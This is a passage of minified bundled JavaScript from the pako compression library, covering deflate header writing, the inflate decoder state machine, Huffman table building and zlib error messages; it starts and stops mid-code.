$(p,p.avail_out===0?-5:m);if(_.strm=p,R=_.last_flush,_.last_flush=D,_.status===S)if(_.wrap===2)p.adler=0,ee(_,31),ee(_,139),ee(_,8),_.gzhead?(ee(_,(_.gzhead.text?1:0)+(_.gzhead.hcrc?2:0)+(_.gzhead.extra?4:0)+(_.gzhead.name?8:0)+(_.gzhead.comment?16:0)),ee(_,255&_.gzhead.time),ee(_,_.gzhead.time>>8&255),ee(_,_.gzhead.time>>16&255),ee(_,_.gzhead.time>>24&255),ee(_,_.level===9?2:2<=_.strategy||_.level<2?4:0),ee(_,255&_.gzhead.os),_.gzhead.extra&&_.gzhead.extra.length&&(ee(_,255&_.gzhead.extra.length),ee(_,_.gzhead.extra.length>>8&255)),_.gzhead.hcrc&&(p.adler=g(p.adler,_.pending_buf,_.pending,0)),_.gzindex=0,_.status=69):(ee(_,0),ee(_,0),ee(_,0),ee(_,0),ee(_,0),ee(_,_.level===9?2:2<=_.strategy||_.level<2?4:0),ee(_,3),_.status=H);else{var W=k+(_.w_bits-8<<4)<<8;W|=(2<=_.strategy||_.level<2?0:_.level<6?1:_.level===6?2:3)<<6,_.strstart!==0&&(W|=32),W+=31-W%31,_.status=H,K(_,W),_.strstart!==0&&(K(_,p.adler>>>16),K(_,65535&p.adler)),p.adler=1}if(_.status===69)if(_.gzhead.extra){for(w=_.pending;_.gzindex<(65535&_.gzhead.extra.length)&&(_.pending!==_.pending_buf_size||(_.gzhead.hcrc&&_.pending>w&&(p.adler=g(p.adler,_.pending_buf,_.pending-w,w)),B(p),w=_.pending,_.pending!==_.pending_buf_size));)ee(_,255&_.gzhead.extra[_.gzindex]),_.gzindex++;_.gzhead.hcrc&&_.pending>w&&(p.adler=g(p.adler,_.pending_buf,_.pending-w,w)),_.gzindex===_.gzhead.extra.length&&(_.gzindex=0,_.status=73)}else _.status=73;if(_.status===73)if(_.gzhead.name){w=_.pending;do{if(_.pending===_.pending_buf_size&&(_.gzhead.hcrc&&_.pending>w&&(p.adler=g(p.adler,_.pending_buf,_.pending-w,w)),B(p),w=_.pending,_.pending===_.pending_buf_size)){T=1;break}T=_.gzindex<_.gzhead.name.length?255&_.gzhead.name.charCodeAt(_.gzindex++):0,ee(_,T)}while(T!==0);_.gzhead.hcrc&&_.pending>w&&(p.adler=g(p.adler,_.pending_buf,_.pending-w,w)),T===0&&(_.gzindex=0,_.status=91)}else _.status=91;if(_.status===91)if(_.gzhead.comment){w=_.pending;do{if(_.pending===_.pending_buf_size&&(_.gzhead.hcrc&&_.pending>w&&(p.adler=g(p.adler,_.pending_buf,_.pending-w,w)),B(p),w=_.pending,_.pending===_.pending_buf_size)){T=1;break}T=_.gzindex<_.gzhead.comment.length?255&_.gzhead.comment.charCodeAt(_.gzindex++):0,ee(_,T)}while(T!==0);_.gzhead.hcrc&&_.pending>w&&(p.adler=g(p.adler,_.pending_buf,_.pending-w,w)),T===0&&(_.status=103)}else _.status=103;if(_.status===103&&(_.gzhead.hcrc?(_.pending+2>_.pending_buf_size&&B(p),_.pending+2<=_.pending_buf_size&&(ee(_,255&p.adler),ee(_,p.adler>>8&255),p.adler=0,_.status=H)):_.status=H),_.pending!==0){if(B(p),p.avail_out===0)return _.last_flush=-1,h}else if(p.avail_in===0&&q(D)<=q(R)&&D!==f)return $(p,-5);if(_.status===666&&p.avail_in!==0)return $(p,-5);if(p.avail_in!==0||_.lookahead!==0||D!==d&&_.status!==666){var Z=_.strategy===2?(function(L,X){for(var Q;;){if(L.lookahead===0&&(fe(L),L.lookahead===0)){if(X===d)return l;break}if(L.match_length=0,Q=n._tr_tally(L,0,L.window[L.strstart]),L.lookahead--,L.strstart++,Q&&(C(L,!1),L.strm.avail_out===0))return l}return L.insert=0,X===f?(C(L,!0),L.strm.avail_out===0?J:N):L.last_lit&&(C(L,!1),L.strm.avail_out===0)?l:A})(_,D):_.strategy===3?(function(L,X){for(var Q,G,se,he,de=L.window;;){if(L.lookahead<=U){if(fe(L),L.lookahead<=U&&X===d)return l;if(L.lookahead===0)break}if(L.match_length=0,L.lookahead>=P&&0<L.strstart&&(G=de[se=L.strstart-1])===de[++se]&&G===de[++se]&&G===de[++se]){he=L.strstart+U;do;while(G===de[++se]&&G===de[++se]&&G===de[++se]&&G===de[++se]&&G===de[++se]&&G===de[++se]&&G===de[++se]&&G===de[++se]&&se<he);L.match_length=U-(he-se),L.match_length>L.lookahead&&(L.match_length=L.lookahead)}if(L.match_length>=P?(Q=n._tr_tally(L,1,L.match_length-P),L.lookahead-=L.match_length,L.strstart+=L.match_length,L.match_length=0):(Q=n._tr_tally(L,0,L.window[L.strstart]),L.lookahead--,L.strstart++),Q&&(C(L,!1),L.strm.avail_out===0))return l}return L.insert=0,X===f?(C(L,!0),L.strm.avail_out===0?J:N):L.last_lit&&(C(L,!1),L.strm.avail_out===0)?l:A})(_,D):o[_.level].func(_,D);if(Z!==J&&Z!==N||(_.status=666),Z===l||Z===J)return p.avail_out===0&&(_.last_flush=-1),h;if(Z===A&&(D===1?n._tr_align(_):D!==5&&(n._tr_stored_block(_,0,0,!1),D===3&&(te(_.head),_.lookahead===0&&(_.strstart=0,_.block_start=0,_.insert=0))),B(p),p.avail_out===0))return _.last_flush=-1,h}return D!==f?h:_.wrap<=0?1:(_.wrap===2?(ee(_,255&p.adler),ee(_,p.adler>>8&255),ee(_,p.adler>>16&255),ee(_,p.adler>>24&255),ee(_,255&p.total_in),ee(_,p.total_in>>8&255),ee(_,p.total_in>>16&255),ee(_,p.total_in>>24&255)):(K(_,p.adler>>>16),K(_,65535&p.adler)),B(p),0<_.wrap&&(_.wrap=-_.wrap),_.pending!==0?h:1)},s.deflateEnd=function(p){var D;return p&&p.state?(D=p.state.status)!==S&&D!==69&&D!==73&&D!==91&&D!==103&&D!==H&&D!==666?$(p,m):(p.state=null,D===H?$(p,-3):h):m},s.deflateSetDictionary=function(p,D){var R,_,w,T,W,Z,L,X,Q=D.length;if(!p||!p.state||(T=(R=p.state).wrap)===2||T===1&&R.status!==S||R.lookahead)return m;for(T===1&&(p.adler=c(p.adler,D,Q,0)),R.wrap=0,Q>=R.w_size&&(T===0&&(te(R.head),R.strstart=0,R.block_start=0,R.insert=0),X=new a.Buf8(R.w_size),a.arraySet(X,D,Q-R.w_size,R.w_size,0),D=X,Q=R.w_size),W=p.avail_in,Z=p.next_in,L=p.input,p.avail_in=Q,p.next_in=0,p.input=D,fe(R);R.lookahead>=P;){for(_=R.strstart,w=R.lookahead-(P-1);R.ins_h=(R.ins_h<<R.hash_shift^R.window[_+P-1])&R.hash_mask,R.prev[_&R.w_mask]=R.head[R.ins_h],R.head[R.ins_h]=_,_++,--w;);R.strstart=_,R.lookahead=P-1,fe(R)}return R.strstart+=R.lookahead,R.block_start=R.strstart,R.insert=R.lookahead,R.lookahead=0,R.match_length=R.prev_length=P-1,R.match_available=0,p.next_in=Z,p.input=L,p.avail_in=W,R.wrap=T,h},s.deflateInfo="pako deflate (from Nodeca project)"},{"../utils/common":41,"./adler32":43,"./crc32":45,"./messages":51,"./trees":52}],47:[function(t,r,s){r.exports=function(){this.text=0,this.time=0,this.xflags=0,this.os=0,this.extra=null,this.extra_len=0,this.name="",this.comment="",this.hcrc=0,this.done=!1}},{}],48:[function(t,r,s){r.exports=function(o,a){var n,c,g,v,d,f,h,m,u,y,b,k,x,I,z,M,O,j,P,U,Y,S,H,l,A;n=o.state,c=o.next_in,l=o.input,g=c+(o.avail_in-5),v=o.next_out,A=o.output,d=v-(a-o.avail_out),f=v+(o.avail_out-257),h=n.dmax,m=n.wsize,u=n.whave,y=n.wnext,b=n.window,k=n.hold,x=n.bits,I=n.lencode,z=n.distcode,M=(1<<n.lenbits)-1,O=(1<<n.distbits)-1;e:do{x<15&&(k+=l[c++]<<x,x+=8,k+=l[c++]<<x,x+=8),j=I[k&M];t:for(;;){if(k>>>=P=j>>>24,x-=P,(P=j>>>16&255)===0)A[v++]=65535&j;else{if(!(16&P)){if((64&P)==0){j=I[(65535&j)+(k&(1<<P)-1)];continue t}if(32&P){n.mode=12;break e}o.msg="invalid literal/length code",n.mode=30;break e}U=65535&j,(P&=15)&&(x<P&&(k+=l[c++]<<x,x+=8),U+=k&(1<<P)-1,k>>>=P,x-=P),x<15&&(k+=l[c++]<<x,x+=8,k+=l[c++]<<x,x+=8),j=z[k&O];i:for(;;){if(k>>>=P=j>>>24,x-=P,!(16&(P=j>>>16&255))){if((64&P)==0){j=z[(65535&j)+(k&(1<<P)-1)];continue i}o.msg="invalid distance code",n.mode=30;break e}if(Y=65535&j,x<(P&=15)&&(k+=l[c++]<<x,(x+=8)<P&&(k+=l[c++]<<x,x+=8)),h<(Y+=k&(1<<P)-1)){o.msg="invalid distance too far back",n.mode=30;break e}if(k>>>=P,x-=P,(P=v-d)<Y){if(u<(P=Y-P)&&n.sane){o.msg="invalid distance too far back",n.mode=30;break e}if(H=b,(S=0)===y){if(S+=m-P,P<U){for(U-=P;A[v++]=b[S++],--P;);S=v-Y,H=A}}else if(y<P){if(S+=m+y-P,(P-=y)<U){for(U-=P;A[v++]=b[S++],--P;);if(S=0,y<U){for(U-=P=y;A[v++]=b[S++],--P;);S=v-Y,H=A}}}else if(S+=y-P,P<U){for(U-=P;A[v++]=b[S++],--P;);S=v-Y,H=A}for(;2<U;)A[v++]=H[S++],A[v++]=H[S++],A[v++]=H[S++],U-=3;U&&(A[v++]=H[S++],1<U&&(A[v++]=H[S++]))}else{for(S=v-Y;A[v++]=A[S++],A[v++]=A[S++],A[v++]=A[S++],2<(U-=3););U&&(A[v++]=A[S++],1<U&&(A[v++]=A[S++]))}break}}break}}while(c<g&&v<f);c-=U=x>>3,k&=(1<<(x-=U<<3))-1,o.next_in=c,o.next_out=v,o.avail_in=c<g?g-c+5:5-(c-g),o.avail_out=v<f?f-v+257:257-(v-f),n.hold=k,n.bits=x}},{}],49:[function(t,r,s){var o=t("../utils/common"),a=t("./adler32"),n=t("./crc32"),c=t("./inffast"),g=t("./inftrees"),v=1,d=2,f=0,h=-2,m=1,u=852,y=592;function b(S){return(S>>>24&255)+(S>>>8&65280)+((65280&S)<<8)+((255&S)<<24)}function k(){this.mode=0,this.last=!1,this.wrap=0,this.havedict=!1,this.flags=0,this.dmax=0,this.check=0,this.total=0,this.head=null,this.wbits=0,this.wsize=0,this.whave=0,this.wnext=0,this.window=null,this.hold=0,this.bits=0,this.length=0,this.offset=0,this.extra=0,this.lencode=null,this.distcode=null,this.lenbits=0,this.distbits=0,this.ncode=0,this.nlen=0,this.ndist=0,this.have=0,this.next=null,this.lens=new o.Buf16(320),this.work=new o.Buf16(288),this.lendyn=null,this.distdyn=null,this.sane=0,this.back=0,this.was=0}function x(S){var H;return S&&S.state?(H=S.state,S.total_in=S.total_out=H.total=0,S.msg="",H.wrap&&(S.adler=1&H.wrap),H.mode=m,H.last=0,H.havedict=0,H.dmax=32768,H.head=null,H.hold=0,H.bits=0,H.lencode=H.lendyn=new o.Buf32(u),H.distcode=H.distdyn=new o.Buf32(y),H.sane=1,H.back=-1,f):h}function I(S){var H;return S&&S.state?((H=S.state).wsize=0,H.whave=0,H.wnext=0,x(S)):h}function z(S,H){var l,A;return S&&S.state?(A=S.state,H<0?(l=0,H=-H):(l=1+(H>>4),H<48&&(H&=15)),H&&(H<8||15<H)?h:(A.window!==null&&A.wbits!==H&&(A.window=null),A.wrap=l,A.wbits=H,I(S))):h}function M(S,H){var l,A;return S?(A=new k,(S.state=A).window=null,(l=z(S,H))!==f&&(S.state=null),l):h}var O,j,P=!0;function U(S){if(P){var H;for(O=new o.Buf32(512),j=new o.Buf32(32),H=0;H<144;)S.lens[H++]=8;for(;H<256;)S.lens[H++]=9;for(;H<280;)S.lens[H++]=7;for(;H<288;)S.lens[H++]=8;for(g(v,S.lens,0,288,O,0,S.work,{bits:9}),H=0;H<32;)S.lens[H++]=5;g(d,S.lens,0,32,j,0,S.work,{bits:5}),P=!1}S.lencode=O,S.lenbits=9,S.distcode=j,S.distbits=5}function Y(S,H,l,A){var J,N=S.state;return N.window===null&&(N.wsize=1<<N.wbits,N.wnext=0,N.whave=0,N.window=new o.Buf8(N.wsize)),A>=N.wsize?(o.arraySet(N.window,H,l-N.wsize,N.wsize,0),N.wnext=0,N.whave=N.wsize):(A<(J=N.wsize-N.wnext)&&(J=A),o.arraySet(N.window,H,l-A,J,N.wnext),(A-=J)?(o.arraySet(N.window,H,l-A,A,0),N.wnext=A,N.whave=N.wsize):(N.wnext+=J,N.wnext===N.wsize&&(N.wnext=0),N.whave<N.wsize&&(N.whave+=J))),0}s.inflateReset=I,s.inflateReset2=z,s.inflateResetKeep=x,s.inflateInit=function(S){return M(S,15)},s.inflateInit2=M,s.inflate=function(S,H){var l,A,J,N,$,q,te,B,C,ee,K,V,fe,re,ae,oe,ne,le,xe,Ee,p,D,R,_,w=0,T=new o.Buf8(4),W=[16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15];if(!S||!S.state||!S.output||!S.input&&S.avail_in!==0)return h;(l=S.state).mode===12&&(l.mode=13),$=S.next_out,J=S.output,te=S.avail_out,N=S.next_in,A=S.input,q=S.avail_in,B=l.hold,C=l.bits,ee=q,K=te,D=f;e:for(;;)switch(l.mode){case m:if(l.wrap===0){l.mode=13;break}for(;C<16;){if(q===0)break e;q--,B+=A[N++]<<C,C+=8}if(2&l.wrap&&B===35615){T[l.check=0]=255&B,T[1]=B>>>8&255,l.check=n(l.check,T,2,0),C=B=0,l.mode=2;break}if(l.flags=0,l.head&&(l.head.done=!1),!(1&l.wrap)||(((255&B)<<8)+(B>>8))%31){S.msg="incorrect header check",l.mode=30;break}if((15&B)!=8){S.msg="unknown compression method",l.mode=30;break}if(C-=4,p=8+(15&(B>>>=4)),l.wbits===0)l.wbits=p;else if(p>l.wbits){S.msg="invalid window size",l.mode=30;break}l.dmax=1<<p,S.adler=l.check=1,l.mode=512&B?10:12,C=B=0;break;case 2:for(;C<16;){if(q===0)break e;q--,B+=A[N++]<<C,C+=8}if(l.flags=B,(255&l.flags)!=8){S.msg="unknown compression method",l.mode=30;break}if(57344&l.flags){S.msg="unknown header flags set",l.mode=30;break}l.head&&(l.head.text=B>>8&1),512&l.flags&&(T[0]=255&B,T[1]=B>>>8&255,l.check=n(l.check,T,2,0)),C=B=0,l.mode=3;case 3:for(;C<32;){if(q===0)break e;q--,B+=A[N++]<<C,C+=8}l.head&&(l.head.time=B),512&l.flags&&(T[0]=255&B,T[1]=B>>>8&255,T[2]=B>>>16&255,T[3]=B>>>24&255,l.check=n(l.check,T,4,0)),C=B=0,l.mode=4;case 4:for(;C<16;){if(q===0)break e;q--,B+=A[N++]<<C,C+=8}l.head&&(l.head.xflags=255&B,l.head.os=B>>8),512&l.flags&&(T[0]=255&B,T[1]=B>>>8&255,l.check=n(l.check,T,2,0)),C=B=0,l.mode=5;case 5:if(1024&l.flags){for(;C<16;){if(q===0)break e;q--,B+=A[N++]<<C,C+=8}l.length=B,l.head&&(l.head.extra_len=B),512&l.flags&&(T[0]=255&B,T[1]=B>>>8&255,l.check=n(l.check,T,2,0)),C=B=0}else l.head&&(l.head.extra=null);l.mode=6;case 6:if(1024&l.flags&&(q<(V=l.length)&&(V=q),V&&(l.head&&(p=l.head.extra_len-l.length,l.head.extra||(l.head.extra=new Array(l.head.extra_len)),o.arraySet(l.head.extra,A,N,V,p)),512&l.flags&&(l.check=n(l.check,A,V,N)),q-=V,N+=V,l.length-=V),l.length))break e;l.length=0,l.mode=7;case 7:if(2048&l.flags){if(q===0)break e;for(V=0;p=A[N+V++],l.head&&p&&l.length<65536&&(l.head.name+=String.fromCharCode(p)),p&&V<q;);if(512&l.flags&&(l.check=n(l.check,A,V,N)),q-=V,N+=V,p)break e}else l.head&&(l.head.name=null);l.length=0,l.mode=8;case 8:if(4096&l.flags){if(q===0)break e;for(V=0;p=A[N+V++],l.head&&p&&l.length<65536&&(l.head.comment+=String.fromCharCode(p)),p&&V<q;);if(512&l.flags&&(l.check=n(l.check,A,V,N)),q-=V,N+=V,p)break e}else l.head&&(l.head.comment=null);l.mode=9;case 9:if(512&l.flags){for(;C<16;){if(q===0)break e;q--,B+=A[N++]<<C,C+=8}if(B!==(65535&l.check)){S.msg="header crc mismatch",l.mode=30;break}C=B=0}l.head&&(l.head.hcrc=l.flags>>9&1,l.head.done=!0),S.adler=l.check=0,l.mode=12;break;case 10:for(;C<32;){if(q===0)break e;q--,B+=A[N++]<<C,C+=8}S.adler=l.check=b(B),C=B=0,l.mode=11;case 11:if(l.havedict===0)return S.next_out=$,S.avail_out=te,S.next_in=N,S.avail_in=q,l.hold=B,l.bits=C,2;S.adler=l.check=1,l.mode=12;case 12:if(H===5||H===6)break e;case 13:if(l.last){B>>>=7&C,C-=7&C,l.mode=27;break}for(;C<3;){if(q===0)break e;q--,B+=A[N++]<<C,C+=8}switch(l.last=1&B,C-=1,3&(B>>>=1)){case 0:l.mode=14;break;case 1:if(U(l),l.mode=20,H!==6)break;B>>>=2,C-=2;break e;case 2:l.mode=17;break;case 3:S.msg="invalid block type",l.mode=30}B>>>=2,C-=2;break;case 14:for(B>>>=7&C,C-=7&C;C<32;){if(q===0)break e;q--,B+=A[N++]<<C,C+=8}if((65535&B)!=(B>>>16^65535)){S.msg="invalid stored block lengths",l.mode=30;break}if(l.length=65535&B,C=B=0,l.mode=15,H===6)break e;case 15:l.mode=16;case 16:if(V=l.length){if(q<V&&(V=q),te<V&&(V=te),V===0)break e;o.arraySet(J,A,N,V,$),q-=V,N+=V,te-=V,$+=V,l.length-=V;break}l.mode=12;break;case 17:for(;C<14;){if(q===0)break e;q--,B+=A[N++]<<C,C+=8}if(l.nlen=257+(31&B),B>>>=5,C-=5,l.ndist=1+(31&B),B>>>=5,C-=5,l.ncode=4+(15&B),B>>>=4,C-=4,286<l.nlen||30<l.ndist){S.msg="too many length or distance symbols",l.mode=30;break}l.have=0,l.mode=18;case 18:for(;l.have<l.ncode;){for(;C<3;){if(q===0)break e;q--,B+=A[N++]<<C,C+=8}l.lens[W[l.have++]]=7&B,B>>>=3,C-=3}for(;l.have<19;)l.lens[W[l.have++]]=0;if(l.lencode=l.lendyn,l.lenbits=7,R={bits:l.lenbits},D=g(0,l.lens,0,19,l.lencode,0,l.work,R),l.lenbits=R.bits,D){S.msg="invalid code lengths set",l.mode=30;break}l.have=0,l.mode=19;case 19:for(;l.have<l.nlen+l.ndist;){for(;oe=(w=l.lencode[B&(1<<l.lenbits)-1])>>>16&255,ne=65535&w,!((ae=w>>>24)<=C);){if(q===0)break e;q--,B+=A[N++]<<C,C+=8}if(ne<16)B>>>=ae,C-=ae,l.lens[l.have++]=ne;else{if(ne===16){for(_=ae+2;C<_;){if(q===0)break e;q--,B+=A[N++]<<C,C+=8}if(B>>>=ae,C-=ae,l.have===0){S.msg="invalid bit length repeat",l.mode=30;break}p=l.lens[l.have-1],V=3+(3&B),B>>>=2,C-=2}else if(ne===17){for(_=ae+3;C<_;){if(q===0)break e;q--,B+=A[N++]<<C,C+=8}C-=ae,p=0,V=3+(7&(B>>>=ae)),B>>>=3,C-=3}else{for(_=ae+7;C<_;){if(q===0)break e;q--,B+=A[N++]<<C,C+=8}C-=ae,p=0,V=11+(127&(B>>>=ae)),B>>>=7,C-=7}if(l.have+V>l.nlen+l.ndist){S.msg="invalid bit length repeat",l.mode=30;break}for(;V--;)l.lens[l.have++]=p}}if(l.mode===30)break;if(l.lens[256]===0){S.msg="invalid code -- missing end-of-block",l.mode=30;break}if(l.lenbits=9,R={bits:l.lenbits},D=g(v,l.lens,0,l.nlen,l.lencode,0,l.work,R),l.lenbits=R.bits,D){S.msg="invalid literal/lengths set",l.mode=30;break}if(l.distbits=6,l.distcode=l.distdyn,R={bits:l.distbits},D=g(d,l.lens,l.nlen,l.ndist,l.distcode,0,l.work,R),l.distbits=R.bits,D){S.msg="invalid distances set",l.mode=30;break}if(l.mode=20,H===6)break e;case 20:l.mode=21;case 21:if(6<=q&&258<=te){S.next_out=$,S.avail_out=te,S.next_in=N,S.avail_in=q,l.hold=B,l.bits=C,c(S,K),$=S.next_out,J=S.output,te=S.avail_out,N=S.next_in,A=S.input,q=S.avail_in,B=l.hold,C=l.bits,l.mode===12&&(l.back=-1);break}for(l.back=0;oe=(w=l.lencode[B&(1<<l.lenbits)-1])>>>16&255,ne=65535&w,!((ae=w>>>24)<=C);){if(q===0)break e;q--,B+=A[N++]<<C,C+=8}if(oe&&(240&oe)==0){for(le=ae,xe=oe,Ee=ne;oe=(w=l.lencode[Ee+((B&(1<<le+xe)-1)>>le)])>>>16&255,ne=65535&w,!(le+(ae=w>>>24)<=C);){if(q===0)break e;q--,B+=A[N++]<<C,C+=8}B>>>=le,C-=le,l.back+=le}if(B>>>=ae,C-=ae,l.back+=ae,l.length=ne,oe===0){l.mode=26;break}if(32&oe){l.back=-1,l.mode=12;break}if(64&oe){S.msg="invalid literal/length code",l.mode=30;break}l.extra=15&oe,l.mode=22;case 22:if(l.extra){for(_=l.extra;C<_;){if(q===0)break e;q--,B+=A[N++]<<C,C+=8}l.length+=B&(1<<l.extra)-1,B>>>=l.extra,C-=l.extra,l.back+=l.extra}l.was=l.length,l.mode=23;case 23:for(;oe=(w=l.distcode[B&(1<<l.distbits)-1])>>>16&255,ne=65535&w,!((ae=w>>>24)<=C);){if(q===0)break e;q--,B+=A[N++]<<C,C+=8}if((240&oe)==0){for(le=ae,xe=oe,Ee=ne;oe=(w=l.distcode[Ee+((B&(1<<le+xe)-1)>>le)])>>>16&255,ne=65535&w,!(le+(ae=w>>>24)<=C);){if(q===0)break e;q--,B+=A[N++]<<C,C+=8}B>>>=le,C-=le,l.back+=le}if(B>>>=ae,C-=ae,l.back+=ae,64&oe){S.msg="invalid distance code",l.mode=30;break}l.offset=ne,l.extra=15&oe,l.mode=24;case 24:if(l.extra){for(_=l.extra;C<_;){if(q===0)break e;q--,B+=A[N++]<<C,C+=8}l.offset+=B&(1<<l.extra)-1,B>>>=l.extra,C-=l.extra,l.back+=l.extra}if(l.offset>l.dmax){S.msg="invalid distance too far back",l.mode=30;break}l.mode=25;case 25:if(te===0)break e;if(V=K-te,l.offset>V){if((V=l.offset-V)>l.whave&&l.sane){S.msg="invalid distance too far back",l.mode=30;break}fe=V>l.wnext?(V-=l.wnext,l.wsize-V):l.wnext-V,V>l.length&&(V=l.length),re=l.window}else re=J,fe=$-l.offset,V=l.length;for(te<V&&(V=te),te-=V,l.length-=V;J[$++]=re[fe++],--V;);l.length===0&&(l.mode=21);break;case 26:if(te===0)break e;J[$++]=l.length,te--,l.mode=21;break;case 27:if(l.wrap){for(;C<32;){if(q===0)break e;q--,B|=A[N++]<<C,C+=8}if(K-=te,S.total_out+=K,l.total+=K,K&&(S.adler=l.check=l.flags?n(l.check,J,K,$-K):a(l.check,J,K,$-K)),K=te,(l.flags?B:b(B))!==l.check){S.msg="incorrect data check",l.mode=30;break}C=B=0}l.mode=28;case 28:if(l.wrap&&l.flags){for(;C<32;){if(q===0)break e;q--,B+=A[N++]<<C,C+=8}if(B!==(4294967295&l.total)){S.msg="incorrect length check",l.mode=30;break}C=B=0}l.mode=29;case 29:D=1;break e;case 30:D=-3;break e;case 31:return-4;case 32:default:return h}return S.next_out=$,S.avail_out=te,S.next_in=N,S.avail_in=q,l.hold=B,l.bits=C,(l.wsize||K!==S.avail_out&&l.mode<30&&(l.mode<27||H!==4))&&Y(S,S.output,S.next_out,K-S.avail_out)?(l.mode=31,-4):(ee-=S.avail_in,K-=S.avail_out,S.total_in+=ee,S.total_out+=K,l.total+=K,l.wrap&&K&&(S.adler=l.check=l.flags?n(l.check,J,K,S.next_out-K):a(l.check,J,K,S.next_out-K)),S.data_type=l.bits+(l.last?64:0)+(l.mode===12?128:0)+(l.mode===20||l.mode===15?256:0),(ee==0&&K===0||H===4)&&D===f&&(D=-5),D)},s.inflateEnd=function(S){if(!S||!S.state)return h;var H=S.state;return H.window&&(H.window=null),S.state=null,f},s.inflateGetHeader=function(S,H){var l;return S&&S.state?(2&(l=S.state).wrap)==0?h:((l.head=H).done=!1,f):h},s.inflateSetDictionary=function(S,H){var l,A=H.length;return S&&S.state?(l=S.state).wrap!==0&&l.mode!==11?h:l.mode===11&&a(1,H,A,0)!==l.check?-3:Y(S,H,A,A)?(l.mode=31,-4):(l.havedict=1,f):h},s.inflateInfo="pako inflate (from Nodeca project)"},{"../utils/common":41,"./adler32":43,"./crc32":45,"./inffast":48,"./inftrees":50}],50:[function(t,r,s){var o=t("../utils/common"),a=[3,4,5,6,7,8,9,10,11,13,15,17,19,23,27,31,35,43,51,59,67,83,99,115,131,163,195,227,258,0,0],n=[16,16,16,16,16,16,16,16,17,17,17,17,18,18,18,18,19,19,19,19,20,20,20,20,21,21,21,21,16,72,78],c=[1,2,3,4,5,7,9,13,17,25,33,49,65,97,129,193,257,385,513,769,1025,1537,2049,3073,4097,6145,8193,12289,16385,24577,0,0],g=[16,16,16,16,17,17,18,18,19,19,20,20,21,21,22,22,23,23,24,24,25,25,26,26,27,27,28,28,29,29,64,64];r.exports=function(v,d,f,h,m,u,y,b){var k,x,I,z,M,O,j,P,U,Y=b.bits,S=0,H=0,l=0,A=0,J=0,N=0,$=0,q=0,te=0,B=0,C=null,ee=0,K=new o.Buf16(16),V=new o.Buf16(16),fe=null,re=0;for(S=0;S<=15;S++)K[S]=0;for(H=0;H<h;H++)K[d[f+H]]++;for(J=Y,A=15;1<=A&&K[A]===0;A--);if(A<J&&(J=A),A===0)return m[u++]=20971520,m[u++]=20971520,b.bits=1,0;for(l=1;l<A&&K[l]===0;l++);for(J<l&&(J=l),S=q=1;S<=15;S++)if(q<<=1,(q-=K[S])<0)return-1;if(0<q&&(v===0||A!==1))return-1;for(V[1]=0,S=1;S<15;S++)V[S+1]=V[S]+K[S];for(H=0;H<h;H++)d[f+H]!==0&&(y[V[d[f+H]]++]=H);if(O=v===0?(C=fe=y,19):v===1?(C=a,ee-=257,fe=n,re-=257,256):(C=c,fe=g,-1),S=l,M=u,$=H=B=0,I=-1,z=(te=1<<(N=J))-1,v===1&&852<te||v===2&&592<te)return 1;for(;;){for(j=S-$,U=y[H]<O?(P=0,y[H]):y[H]>O?(P=fe[re+y[H]],C[ee+y[H]]):(P=96,0),k=1<<S-$,l=x=1<<N;m[M+(B>>$)+(x-=k)]=j<<24|P<<16|U|0,x!==0;);for(k=1<<S-1;B&k;)k>>=1;if(k!==0?(B&=k-1,B+=k):B=0,H++,--K[S]==0){if(S===A)break;S=d[f+y[H]]}if(J<S&&(B&z)!==I){for($===0&&($=J),M+=l,q=1<<(N=S-$);N+$<A&&!((q-=K[N+$])<=0);)N++,q<<=1;if(te+=1<<N,v===1&&852<te||v===2&&592<te)return 1;m[I=B&z]=J<<24|N<<16|M-u|0}}return B!==0&&(m[M+B]=S-$<<24|64<<16|0),b.bits=J,0}},{"../utils/common":41}],51:[function(t,r,s){r.exports={2:"need dictionary",1:"stream end",0:"","-1":"file error","-2":"stream error","-3":"data error","-4":"insufficient memory","-5":"buffer error","-6":"incompatible version"}},{}],52:[function(t,r,s){var o=t("../utils/common"),a=0,n=1;function c(w){for(var T=w.length;0<=--T;)w[T]=0}var g=0,v=29,d=256,f=d+1+v,h=30,m=19,u=2*f+1,y=15,b=16,k=7,x=256,I=16,z=17,M=18,O=[0,0,0,0,0,0,0,0,1,1,1,1,2,2,2,2,3,3,3,3,4,4,4,4,5,5,5,5,0],j=[0,0,0,0,1,1,2,2,3,3,4,4,5,5,6,6,7,7,8,8,9,9,10,10,11,11,12,12,13,13],P=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,3,7],U=[16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15],Y=new Array(2*(f+2));c(Y);var S=new Array(2*h);c(S);var H=new Array(512);c(H);var l=new Array(256);c(l);var A=new Array(v);c(A);var J,N,$,q=new Array(h);function te(w,T,W,Z,L){this.static_tree=w,this.extra_bits=T,this.extra_base=W,this.elems=Z,this.max_length=L,this.has_stree=w&&w.length}function B(w,T){this.dyn_tree=w,this.max_code=0,this.stat_desc=T}function C(w){return w<256?H[w]:H[256+(w>>>7)]}function ee(w,T){w.pending_buf[w.pending++]=255&T,w.pending_buf[w.pending++]=T>>>8&255}function K(w,T,W){w.bi_valid>b-W?(w.bi_buf|=T<<w.bi_valid&65535,ee(w,w.bi_buf),w.bi_buf=T>>b-w.bi_valid,w.bi_valid+=W-b):(w.bi_buf|=T<<w.bi_valid&65535,w.bi_valid+=W)}function V(w,T,W){K(w,W[2*T],W[2*T+1])}function fe(w,T){for(var W=0;W|=1&w,w>>>=1,W<<=1,0<--T;);return W>>>1}function re(w,T,W){var Z,L,X=new Array(y+1),Q=0;for(Z=1;Z<=y;Z++)X[Z]=Q=Q+W[Z-1]<<1;for(L=0;L<=T;L++){var G=w[2*L+1];G!==0&&(w[2*L]=fe(X[G]++,G))}}function ae(w){var T;for(T=0;T<f;T++)w.dyn_ltree[2*T]=0;for(T=0;T<h;T++)w.dyn_dtree[2*T]=0;for(T=0;T<m;T++)w.bl_tree[2*T]=0;w.dyn_ltree[2*x]=1,w.opt_len=w.static_len=0,w.last_lit=w.matches=0}function oe(w){8<w.bi_valid?ee(w,w.bi_buf):0<w.bi_valid&&(w.pending_buf[w.pending++]=w.bi_buf),w.bi_buf=0,w.bi_valid=0}function ne(w,T,W,Z){var L=2*T,X=2*W;return w[L]<w[X]||w[L]===w[X]&&Z[T]<=Z[W]}function le(w,T,W){for(var 